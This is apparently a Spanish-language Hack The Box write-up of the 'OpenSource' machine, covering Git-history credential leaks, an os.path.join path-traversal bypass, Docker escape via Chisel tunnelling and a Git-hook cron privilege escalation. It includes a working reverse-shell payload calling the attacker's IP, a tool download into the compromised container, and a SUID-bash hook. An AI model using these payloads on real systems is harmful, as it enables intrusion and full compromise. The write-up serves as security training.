
---

![image](../OpenSource/Images/logo.png)

# 1. Ficha técnica

- **Ficha técnica Nombre:** OpenSource 
- **Dificultad:** Fácil 
- **Plataforma:** Hack The Box 
- **Autor:** Irogir 
- **Técnicas usadas:** Enumeración de proyectos Git, evasión de sanitización y bypass de filtros en parámetros controlados por el usuario (Flask), escape de contenedor Docker, reenvío de puertos con Chisel y abuso de tareas Cron (Escalada de privilegios).

---

# 2. Reconocimiento

## 2.1. Comprobación de conectividad

Al iniciar la fase de reconocimiento en un entorno de CTF, es fundamental verificar la conectividad hacia el objetivo. Para ello, se utilizó la herramienta `ping` con el fin de enviar paquetes de solicitud de eco **ICMP**.

**Comando ejecutado:**

```bash
ping -c 4 10.129.227.140
```

**Resultados obtenidos:**

```plaintext
PING 10.129.227.140 (10.129.227.140) 56(84) bytes of data.
64 bytes from 10.129.227.140: icmp_seq=1 ttl=63 time=115 ms
64 bytes from 10.129.227.140: icmp_seq=2 ttl=63 time=119 ms
64 bytes from 10.129.227.140: icmp_seq=3 ttl=63 time=117 ms
64 bytes from 10.129.227.140: icmp_seq=4 ttl=63 time=117 ms

--- 10.129.227.140 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 114.896/116.843/118.820/1.391 ms
```

### Análisis de los resultados

- **Conectividad:** La recepción exitosa de los 4 paquetes transmitidos ($0\%$ de pérdida) confirma una conectividad estable con el objetivo.
- **Identificación del Sistema Operativo:** El valor de **TTL (Time to Live) recibido es de 63**. Sabiendo que el TTL por defecto para sistemas basados en **Linux** es de 64, se puede inferir con alta probabilidad que la máquina objetivo opera bajo este sistema operativo.
- **Topología de red:** La diferencia de un punto en el TTL ($64 - 1 = 63$) indica la presencia de **un nodo intermediario** (como un router o firewall) en la ruta, el cual consumió un salto de red antes de que el paquete retornara.

---

## 2.2. Escaneo de puertos TCP

Una vez confirmada la conectividad con el objetivo, el siguiente paso lógico es identificar los puertos TCP que se encuentran abiertos. Para ello, se utilizó la herramienta `nmap` configurando un escaneo de tipo _SYN Stealth Scan_ (`-sS`) y optimizando la velocidad de transmisión (`--min-rate 5000`) para agilizar el proceso.

**Comando ejecutado:**

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 10.129.227.140
```

**Resultados obtenidos:**

```bash 
Nmap scan report for 10.129.227.140
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Análisis de los resultados

- **Puertos detectados:** El escaneo determinó que la máquina objetivo únicamente tiene dos puertos TCP abiertos: el **puerto 22 (SSH)** y el **puerto 80 (HTTP)**.

>[!WARNING] **Conclusión de la fase:** Habiendo reducido la superficie de ataque a estos dos vectores, se procederá con una fase de enumeración exhaustiva sobre ambos servicios. Se priorizará el puerto 80 (HTTP), debido a que las aplicaciones web suelen presentar una superficie de exposición más amplia y propensa a vulnerabilidades lógicas o de configuración.

---

# 3. Enumeración

## 3.1. Enumeración de puertos abiertos

Para dar inicio a la fase de enumeración dirigida, se utilizó nuevamente `nmap` sobre los puertos previamente identificados ($22$ y $80$). En esta ocasión, se activó la detección de versiones de servicios (`-sV`) y se ejecutaron los scripts de reconocimiento por defecto del _Nmap Scripting Engine_ (`-sC`).

**Comando ejecutado:**

```bash
nmap -p22,80 -sCV 10.129.227.140
```

**Resultados obtenidos:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.10.3)
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Consolidación y análisis de la información recopilada

A continuación, se tabulan los hallazgos clave derivados del escaneo:

| **Puerto / Servicio** | **Versión**          | **Información Adicional**                                                                      | **Posibles Vulnerabilidades / Vectores**                                                                     |
| --------------------- | -------------------- | ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| **22 / TCP (SSH)**    | OpenSSH 7.6p1        | La cabecera del servicio expone una distribución Ubuntu (específicamente _Ubuntu Bionic_).     | Conocida para OpenSSH < 7.7: **Username Enumeration** (CVE-2018-15473).                                      |
| **80 / TCP (HTTP)**   | Werkzeug httpd 2.1.2 | • Corre bajo **Python 3.10.3**.<br><br>• Título del sitio: `upcloud - Upload files for Free!`. | No se identificaron vulnerabilidades públicas conocidas (_1-day_) para esta versión específica del servicio. |

**Análisis estratégico:** Tras consolidar la información, el servicio **HTTP (Puerto 80)** se establece como el vector de ataque prioritario. La presencia de un aplicativo web que explícitamente permite la **subida de archivos** amplía drásticamente la superficie de exposición.

Es crucial evaluar a fondo el comportamiento del servidor ante la subida de archivos (validación de extensiones, _magic numbers_, sanitización de nombres, etc.). Adicionalmente, el uso de _Werkzeug_ delata de forma casi inequívoca un _stack_ de desarrollo basado en **Flask**, por lo que también se mantendrá el foco en posibles vulnerabilidades de inyección de plantillas del lado del servidor (SSTI).

---

## 3.2. Enumeración web

La fase de enumeración web comenzó con una inspección visual de la aplicación a través del navegador. El sitio corresponde a **Upcloud**, una plataforma diseñada para el almacenamiento e intercambio de archivos de forma gratuita y sin necesidad de registro.

![images](../OpenSource/Images/web-1.png)

A través de una navegación e inspección inicial, se identificaron los siguientes componentes y comportamientos clave:

### Información recopilada y estructura del sitio

- **Módulo de carga (`/upcloud`):** Es la sección principal destinada a la subida de archivos. Al evaluar el comportamiento del servidor ante diferentes extensiones, se determinó lo siguiente:

    - **Scripts maliciosos (ej. `.sh`, `.py`):** El servidor los almacena y renderiza como texto plano; no se procesan ni se ejecutan en el lado del servidor.
    - **Archivos ejecutables:** Son almacenados de forma pasiva, es decir que al intentar acceder al recurso, el servidor web fuerza su descarga en el cliente en lugar de ejecutarlos.

- **Directorio de almacenamiento (`/uploads`):** Ruta donde se alojan temporalmente los archivos subidos por los usuarios. Un hallazgo crítico en el diseño de este directorio es que **el servidor conserva el nombre original del archivo** proporcionado por el usuario, sin aplicar ningún proceso de aleatorización o hash. Controlar el nombre del archivo dentro del sistema de archivos del servidor representa un vector de riesgo elevado si no existe una sanitización estricta contra ataques de _Path Traversal_ o inyecciones.
  
- **Directorio de descargas (`/download`):** En esta ruta se localizó un hallazgo de alto impacto: **el código fuente/binario de la propia aplicación web se encuentra expuesto** para su descarga. Disponer del ejecutable o código del aplicativo permitirá realizar un análisis en local (*Ingeniería inversa*), facilitando la identificación de fallas en la lógica de negocio, manejo de parámetros o vulnerabilidades ocultas que puedan ser explotadas para comprometer el sistema.

---

## 3.3. Inspección y análisis del código fuente

Tras la descarga del archivo comprimido `source.zip`, se procedió a su extracción mediante el comando `unzip`. Durante este proceso, se identificó que el directorio expuesto correspondía a un repositorio de **Git**. La presencia de los metadatos de Git (`.git`) en entornos de producción o archivos distribuidos representa un riesgo crítico, ya que permite realizar una auditoría del historial de confirmaciones (_commits_), inspeccionar ramas de desarrollo obsoletas o recuperar código eliminado.

### Inspección del repositorio Git

Inicialmente, se examinó el historial de cambios en la rama activa (`public`) utilizando el comando `git log`. Se identificaron únicamente dos _commits_, los cuales no aportaban información de valor para la auditoría.

Posteriormente, se listaron las ramas disponibles mediante `git branch -a`, detectando la existencia de una rama de desarrollo denominada `dev`. Se realizó el cambio a dicha rama utilizando `git switch dev` y se procedió a auditar su historial. Al comparar los cambios entre los _commits_ de desarrollo, se descubrió la exposición de credenciales en un archivo de configuración.

**Comando ejecutado:**

```bash
git diff 'be4da71987bbbc8fae7c961fb2de01ebd0be1997' 'a76f8f75f7a4a12b706b0cf9c983796fa1985820'
```

**Resultados obtenidos:**

```plaintext
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

De este hallazgo se extrajeron los siguientes datos de autenticación:

- **Usuario:** `dev01`
- **Contraseña:** `Soulless_Developer#2022`
- **Ruta de entorno:** `/home/dev01/` (Confirma la existencia del usuario local en el sistema).

### Análisis de la información y vector de acceso

Considerando que el **puerto 22 (SSH)** se encuentra abierto, se intentó utilizar la contraseña expuesta para obtener acceso directo a la máquina objetivo.

```bash
ssh dev01@10.129.227.140
```

**Respuesta del servidor:**

```plaintext
dev01@10.129.227.140: Permission denied (publickey).
```

**Interpretación del resultado:** La respuesta `Permission denied (publickey)` es un indicador positivo que valida la existencia del usuario `dev01` en el sistema operativo. Sin embargo, también confirma que la autenticación mediante contraseña se encuentra deshabilitada en la configuración del servicio SSH, exigiendo exclusivamente el uso de una llave privada (`id_rsa`) autorizada para iniciar sesión.

---

## 3.4. Análisis de la estructura web e ingeniería inversa

Tras descartar el acceso directo por SSH, se procedió a realizar un análisis de caja blanca (_White-box analysis_) sobre el código fuente de la aplicación web y su entorno de despliegue.

### Configuración del Dockerfile

El archivo `Dockerfile` recuperado presenta la siguiente configuración:

```docker
FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache supervisor

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY app .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 80

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Set mode
ENV MODE="PRODUCTION"
ENV FLASK_DEBUG=1

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

**Deducciones clave del entorno:**

- El aplicativo web se despliega bajo un contenedor basado en **Alpine Linux**.
- La aplicación se ejecuta dentro del directorio raíz `/app`.
- Confirma de manera definitiva el uso de **Flask** como _framework_ web principal.

Al examinar el punto de entrada de la aplicación (`run.py`), se observó la inicialización estándar del servidor:

```plaintext
import os

from app import app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
```

#### Identificación de sanitización deficiente y vulnerabilidad en la lógica de rutas

Al inspeccionar el archivo `views.py`, se identificó la función encargada de procesar el nombre de los archivos subidos por los usuarios antes de almacenarlos localmente:

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

La función `get_file_name` intenta mitigar ataques de _Path Traversal_ eliminando de forma recursiva la secuencia `../`. Sin embargo, esta es la única validación que recibe el parámetro proporcionado por el usuario antes de ser procesado por la siguiente línea:

```python
file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
```

#### Comportamiento de `os.path.join` con rutas absolutas

El fallo crítico de seguridad reside en el comportamiento intrínseco de la función `os.path.join` en Python. Según la documentación oficial, **si uno de los componentes pasados a la función es una ruta absoluta (es decir, comienza con `/`), todos los componentes anteriores se descartan** y la unión se reinicia desde dicho parámetro absoluto.

A continuación, se recrea este comportamiento de manera interactiva para validar el vector:

```python
>>> import os
>>> filename1 = "test.txt"
>>> filename2 = "/tmp/test.txt"
>>> os.path.join(os.getcwd(), "/var/www/html", filename1)
'/var/www/html/test.txt'
>>> os.path.join(os.getcwd(), "/var/www/html", filename2)
'/tmp/test.txt'
```

##### Análisis del vector de ataque (Impacto)

Debido a que la sanitización de la aplicación solo busca y destruye la cadena `../`, un atacante puede evadir por completo el directorio de destino final (`public/uploads/`) enviando una **ruta absoluta** en el nombre del archivo (por ejemplo, `/app/app/views.py`).

Dado que conocemos la estructura exacta gracias al Dockerfile y al código fuente descargado, este comportamiento permite **sobrescribir archivos críticos y arbitrarios dentro del servidor**.

>[!WARNING] **Conclusión de la fase:** El vector de ataque prioritario consistirá en interceptar la petición de subida de archivos y modificar el parámetro del nombre del archivo para apuntar directamente a `/app/app/views.py`. Al sobrescribir este archivo, se puede inyectar una _Reverse Shell_ en una de las rutas existentes de Flask, logrando así la ejecución remota de comandos (RCE) y el acceso inicial al contenedor con los privilegios del proceso web.

---

# 4. Acceso inicial

## 4.1. Intrusión al contenedor Docker

Validada la vulnerabilidad de escritura arbitraria de archivos a través de `os.path.join`, se diseñó un vector para sobrescribir el archivo legítimo `views.py` del servidor web. El objetivo fue registrar una nueva ruta dentro del aplicativo Flask que permitiera ejecutar comandos de manera remota al ser invocada.

**Payload inyectado en `views.py`:**

```python
@app.route('/reverse')
def shell():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.102 9001 >/tmp/f")
```

> **Mecanismo técnico:** El código anterior define el recurso web `/reverse`. Al recibir una petición HTTP de tipo GET en esta ruta, el intérprete de Python invoca al sistema operativo subyacente a través de `os.system()` y ejecuta un _one-liner_ de Bash. Este comando crea una tubería con nombre (_named pipe_ / FIFO) para redirigir una shell interactiva (`sh -i`) hacia la dirección IP y puerto del atacante.

### Metodología de explotación

#### Paso 1: Preparación del puerto de escucha (Listener)

En la máquina del atacante, se inicializó un _listener_ empleando `netcat` para capturar la conexión entrante de la shell:

```bash
nc -nlvp 9001
```

#### Paso 2: Intercepción de la petición y evasión de ruta con Burp Suite

Se cargó el archivo modificado `views.py` a través del módulo de subidas de la aplicación web. Antes de que la solicitud llegara al servidor, se interceptó el tráfico utilizando **Burp Suite** para modificar el parámetro `filename` en el cuerpo de la petición HTTP, forzando la ruta absoluta del destino.

![image](../OpenSource/Images/peticion.png)

**Petición HTTP modificada en Burp Suite:**

```bash
POST /upcloud HTTP/1.1
Host: 10.129.227.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.227.140/upcloud
Content-Type: multipart/form-data; boundary=----geckoformboundarye48c5e6ade78a7993513b665bae948d
Content-Length: 1258
Origin: http://10.129.227.140
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundarye48c5e6ade78a7993513b665bae948d
Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
Content-Type: text/x-python
```

Tras enviar la petición modificada, el servidor procesó el nombre `/app/app/views.py`. Debido a la vulnerabilidad lógica previamente analizada, el archivo original fue completamente sobrescrito con la versión maliciosa.

#### Paso 3: Activación de la Reverse Shell

Con el archivo del servidor modificado, se procedió a interactuar con el nuevo *recurso* mediante una petición GET utilizando `curl` para forzar la ejecución del payload:

```bash
curl http://10.129.227.140/reverse
```

**Resultado:** En la ventana del _listener_ de `netcat`, se recibió de forma inmediata una conexión interactiva, obteniendo acceso inicial al contenedor con privilegios máximos (**root**), debido a que el proceso del servidor web corría bajo dicho contexto en la infraestructura Docker.

![image](../OpenSource/Images/access-1.png)

---

# 5. Post explotación

## 5.1. Reconocimiento interno y preparación de Port-Forwarding

Tras comprometer el contenedor Docker (con dirección IP `172.17.0.8`), el siguiente objetivo estratégico consiste en evadir el aislamiento del contenedor (_Container Escape_). Un vector común para lograrlo es identificar servicios expuestos exclusivamente en la interfaz de bucle de retorno (_localhost_) o en la red interna del host principal, los cuales suelen estar protegidos por un cortafuegos desde el exterior.

Debido a la arquitectura estándar de redes en Docker, se infiere que la dirección IP de la interfaz puente (_gateway_) del host principal es `172.17.0.1`.

### Escaneo de puertos interno

Dadas las restricciones de almacenamiento y la ausencia de herramientas avanzadas de red dentro del contenedor, se diseñó un script _one-liner_ nativo en Bash utilizando `netcat` para barrer los primeros 10,000 puertos TCP:

```bash
for port in $(seq 1 10000); do nc -nz 172.17.0.1 $port && echo "$port -> Abierto"; done
```

**Resultados obtenidos:**

```bash
22 -> Abierto
80 -> Abierto
3000 -> Abierto
6000 -> Abierto
6001 -> Abierto
6002 -> Abierto
6003 -> Abierto
6004 -> Abierto
6005 -> Abierto
6006 -> Abierto
6007 -> Abierto
```

### Enumeración del puerto 3000

Al verificar manualmente los servicios, se detectó una cabecera HTTP en el puerto 3000 mediante una petición directa con `netcat`:

```bash
nc -nv 172.17.0.1 3000
```

**Respuesta del servidor:**

```bash
172.17.0.1 (172.17.0.1:3000) open
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

Ante la falta de la herramienta `curl` en el contenedor, se empleó `wget` para descargar el documento index y analizar el código HTML en busca de firmas o metadatos:

**Hallazgo en el código fuente:**

```bash
content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go"
```

> **Identificación del activo:** El servicio alojado en el puerto 3000 corresponde a **Gitea**, una plataforma auto-alojada de código abierto para la gestión de repositorios Git. Al tratarse de un sistema de control de versiones, se convierte inmediatamente en un objetivo crítico.

Para auditar este servicio de forma cómoda y exhaustiva desde la máquina de atacante, se determinó realizar un túnel de red (_Port Forwarding_) utilizando la herramienta **Chisel**.

### Metodología de transferencia y despliegue de Chisel

#### Paso 1: Preparación y descarga en la máquina local (Atacante)

Se descargó la versión del binario de Chisel correspondiente a la arquitectura del contenedor del objetivo (`Linux x86_64`), se descomprimió y se levantó un servidor web temporal en Python para su transferencia:

```bash
# Descarga y descompresión del binario
wget https://github.com/jpillora/chisel/releases/download/v1.11.7/chisel_1.11.7_linux_amd64.gz
gunzip chisel_1.11.7_linux_amd64.gz
mv chisel_1.11.7_linux_amd64 chisel
chmod +x chisel

# Inicialización del servidor de transferencia
python3 -m http.server 8080
```

#### Paso 2: Descarga y configuración en el contenedor del objetivo

Desde la shell obtenida en el contenedor comprometido, se accedió al directorio `/tmp` para realizar la descarga del binario:

```bash
# Cambio a directorio de trabajo temporal
cd /tmp

# Descarga del binario desde la máquina atacante
wget http://10.10.16.102:8080/chisel

# Asignación de privilegios de ejecución
chmod +x chisel
```

---

## 5.2. Redireccionamiento de puertos con Chisel

Con la herramienta desplegada en ambos extremos, se configuró un túnel TCP reverso mediante **Chisel** para redirigir el puerto local del servicio Gitea hacia la máquina atacante, evadiendo así las restricciones de la red interna del contenedor.

La sintaxis y los roles empleados en cada infraestructura se detallan a continuación:

### A. Configuración en la máquina atacante (Servidor Chisel)

La máquina de ataque se configuró en modo servidor (`server`), estableciendo un puerto de escucha de control ($8084$) y habilitando explícitamente las conexiones entrantes para el redireccionamiento reverso (`--reverse`):

```bash
./chisel server -p 8084 --reverse
```

### B. Configuración en el contenedor comprometido (Cliente Chisel)

El contenedor Docker actuó como cliente (`client`), iniciando una conexión hacia el puerto de control del atacante. Mediante la bandera de reenvío reverso (`R`), se indicó que cualquier petición dirigida al puerto **3000 local de la máquina de ataque** sea encapsulada a través del túnel y retransmitida hacia el puerto **3000 de la IP del host principal (`172.17.0.1`)**:

```bash
./chisel client 10.10.16.102:8084 R:3000:172.17.0.1:3000
```

#### Verificación del túnel y acceso al servicio

![image](../OpenSource/Images/gitea.png)

**Confirmación del vector:** El establecimiento exitoso del túnel reverso expone de manera segura la aplicación interna en la máquina local. A partir de este momento, es posible interactuar directamente con la plataforma **Gitea** abriendo un navegador web local y navegando a la dirección URL: `http://localhost:3000`. Esto permite iniciar la fase de enumeración web avanzada y auditoría de vulnerabilidades sobre el gestor de repositorios desde el host de ataque.

---

## 5.3. Evasión del contenedor (Container Escape)

Tras establecer el túnel con Chisel, se accedió al servicio web corporativo de **Gitea** a través de `http://localhost:3000`. En el panel de autenticación, se ingresaron las credenciales previamente expuestas en el historial de Git: `dev01:Soulless_Developer#2022`.

Una vez iniciada la sesión, se localizó un repositorio privado que contenía una copia de seguridad o réplica del directorio personal (`/home/dev01`) del usuario en el host principal. Al inspeccionar el contenido, se descubrió el directorio oculto `.ssh`, el cual almacenaba la llave privada de autenticación del usuario.

![image](../OpenSource/Images/backup.png)

**Contenido de la llave privada identificada (`id_rsa`):**

```plaintext
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
...
[... Contenido de la llave RSA omitido para mayor brevedad en el reporte ...]
...
o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
-----END RSA PRIVATE KEY-----
```

### Autenticación mediante SSH al sistema anfitrión (Host)

Disponer de la llave privada legítima (`id_rsa`) del usuario `dev01` permite evadir el aislamiento del contenedor Docker de forma definitiva, interactuando directamente con el servicio SSH del host principal que anteriormente rechazaba las conexiones basadas en contraseñas.

#### Metodología de acceso:

1. **Creación y asignación de privilegios al archivo de identidad:** En la máquina atacante, se guardó el contenido de la llave en un archivo local llamado `id_rsa`. Para que el cliente SSH de Linux acepte el archivo de identidad, se le asignaron permisos restrictivos (lectura exclusiva para el propietario) mediante el formato octal `600`. De lo contrario, la conexión sería abortada por motivos de seguridad.

```bash
chmod 600 id_rsa
```

2. **Establecimiento de la sesión SSH:** Se ejecutó el comando de conexión apuntando a la dirección IP del objetivo e indicando el uso de la llave privada a través del parámetro `-i`:

```bash
ssh -i id_rsa dev01@10.129.227.140
```

**Resultado:** La autenticación se completó de manera exitosa sin requerir contraseña, proporcionando una sesión interactiva en la consola (_shell_) del sistema operativo anfitrión bajo el contexto del usuario `dev01`. Con esto se consolida el control sobre el host principal y se da por concluida la fase de acceso inicial y escape del contenedor.

![image](../OpenSource/Images/ssh-access.png)

---

## 5.4. Escalada de privilegios

### Enumeración inicial de vectores locales

Una vez obtenido el acceso al host principal como el usuario `dev01`, se procedió a realizar un reconocimiento local del sistema con el fin de identificar vectores potenciales para elevar privilegios al contexto de administrador (`root`). Durante esta fase, se evaluaron los siguientes elementos estándar:

- **Sudoers (`sudo -l`):** Al validar la contraseña `Soulless_Developer#2022`, se confirmó su vigencia para el usuario `dev01`. Sin embargo, la configuración de la directiva `sudoers` determinó que este usuario no cuenta con permisos para ejecutar comandos como superusuario.
- **Binarios con permisos SUID/SGID:** No se localizaron archivos ejecutables anómalos o vulnerables con el bit SUID configurado.
- **Capacidades del sistema (_Capabilities_):** La inspección de capacidades extendidas sobre binarios del sistema no arrojó ninguna configuración explotable.

### Detección de tareas en segundo plano (Cron Jobs) con `pspy`

Ante la ausencia de vectores estáticos, se procedió a auditar los procesos activos y las tareas programadas en tiempo real. Para ello, se utilizó la herramienta **pspy**, un monitor de procesos en línea de comandos que permite capturar eventos de ejecución (invocaciones de comandos por otros usuarios, tareas Cron, etc.) sin necesidad de interactuar con el sistema de archivos del kernel `/proc` de forma directa ni requerir privilegios elevados.

#### 1. Transferencia y ejecución de pspy

El binario correspondiente a la arquitectura del host (`pspy64`) fue transferido desde la máquina atacante hacia el directorio `/tmp` del objetivo, utilizando el servidor web temporal de Python ya activo:

```bash
cd /tmp
wget http://10.10.16.102:8080/pspy64
chmod +x pspy64
./pspy64
```

#### 2. Intercepción e inspección de procesos programados

Tras monitorear el sistema por un breve periodo de tiempo, `pspy` capturó una tarea periódica recurrente automatizada a través del demonio `CRON`, la cual es ejecutada con privilegios máximos por el usuario **root** (`UID=0`):

```bash
2026/06/29 01:37:01 CMD: UID=0     PID=14283  | /bin/sh -c /usr/local/bin/git-sync 
2026/06/29 01:37:01 CMD: UID=0     PID=14282  | /usr/sbin/CRON -f 
2026/06/29 01:37:01 CMD: UID=0     PID=14285  | /bin/bash /usr/local/bin/git-sync
```

Al inspeccionar el código del script involucrado (`/usr/local/bin/git-sync`), se descubrió la siguiente lógica de automatización:

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

### Análisis del vector de riesgo e Impacto

El análisis del script `/usr/local/bin/git-sync` expone un vector de seguridad crítico basado en una vulnerabilidad lógica de configuración:

- **Contexto de ejecución:** El script se ejecuta como **root**, lo que significa que cualquier subproceso o comando derivado del script heredará sus privilegios totales de administrador.
- **Ubicación operativa:** La primera instrucción del script es posicionarse dentro del directorio personal del usuario comprometido (`cd /home/dev01/`).
- **El peligro de los ganchos de Git (_Git Hooks_):** Debido a que el script ejecuta comandos nativos de Git (`git status`, `git add`, `git commit`) dentro de un espacio de nombres controlado completamente por el usuario `dev01`, un atacante puede manipular la configuración local de Git (directorio `.git/hooks/`) e inyectar un script malicioso en ganchos automáticos (como `pre-commit`). Cuando la tarea Cron de `root` invoque el comando `git commit`, ejecutará el código malicioso de manera involuntaria en el host principal bajo privilegios de superusuario.

---

## 5.5. Ejecución del vector de escalada y obtención de acceso como Root

Para capitalizar la vulnerabilidad lógica identificada en el script automatizado por `CRON`, se procedió a configurar un gancho de Git (_Git Hook_). Específicamente, se utilizó el gancho `pre-commit`, el cual se ejecuta de forma mandatoria e inmediata antes de que Git procese la confirmación de los cambios en el repositorio.

Dado que el entorno de trabajo dentro de `/home/dev01/` está bajo el control total de nuestro usuario actual, el procedimiento se estructuró de la siguiente manera:

### Metodología de explotación:

**1. Inyección del payload en el gancho `pre-commit`:** Se generó el script malicioso dentro del directorio de configuración de Git. El payload tiene como objetivo asignar el bit SUID (`chmod u+s`) al binario nativo de Bash del sistema:

```bash
echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit
```

**2. Asignación de permisos de ejecución:** Para que Git pueda invocar el script de forma automática al procesar el commit, es indispensable otorgarle permisos de ejecución al archivo:

```bash
chmod +x ~/.git/hooks/pre-commit
```

**3. Monitoreo de la persistencia (Opcional):** Con el fin de validar el momento exacto en el que la tarea Cron de **root** se activa y ejecuta el comando `git commit` (activando en consecuencia nuestro gancho), se monitorizó el binario de Bash en intervalos de 1 segundo:

```bash
watch -n1 ls -la /bin/bash
```

Tras completarse el ciclo de ejecución programado del Cron, se confirmó la alteración exitosa de los permisos del binario, visualizando el bit **`s`** (SUID) activo en los privilegios del propietario:

```bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

#### Compromiso total del sistema (Escalada exitosa)

Una vez que `/bin/bash` posee el bit SUID de **root**, se procedió a invocar una nueva shell interactiva. Es mandatorio emplear el parámetro `-p` (_privileged mode_) para indicarle a Bash que mantenga y no descarte los privilegios del propietario efectivo del archivo (`root`) durante la sesión:

```bash
bash -p
```

**Resultado final:** La consola se inicializó bajo el contexto del superusuario, consolidando el compromiso total del host principal (_System Root Compromise_).

![image](../OpenSource/Images/root.png)

----